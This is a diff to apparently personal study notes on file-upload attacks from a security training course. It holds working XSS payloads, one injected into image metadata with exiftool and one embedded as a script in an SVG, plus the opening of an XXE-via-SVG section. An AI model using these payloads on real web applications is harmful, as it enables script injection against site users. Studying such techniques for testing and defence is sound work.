@@ -16,8 +16,18 @@ If the web applications displays an image's metadata after its upload, we can pe
   exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
   ```
   `Note`: It is possible to perform this attack using one of the Metadata parameters that accept raw text, like the `Comment` or 
-  `Artist` parameters. Furthermore, if we change the image's MIME-Type to text/html, some web applications may show it as an HTML 
+  `Artist` parameters. Furthermore, if we change the image's `MIME-Type` to `text/html`, some web applications may show it as an HTML 
   document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.
+---
+## Common file disclosure
+- Custom `.svg` image:
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
+      <circle cx="50" cy="50" r="40" fill="red" />
+  </svg>
+  ```
 - `XSS` via HTB.svg:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
@@ -27,6 +37,7 @@ If the web applications displays an image's metadata after its upload, we can pe
       <script type="text/javascript">alert(window.origin);</script>
   </svg>
   ```
+## Source code file Disclosure
 - `XXE` via `.svg` file:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
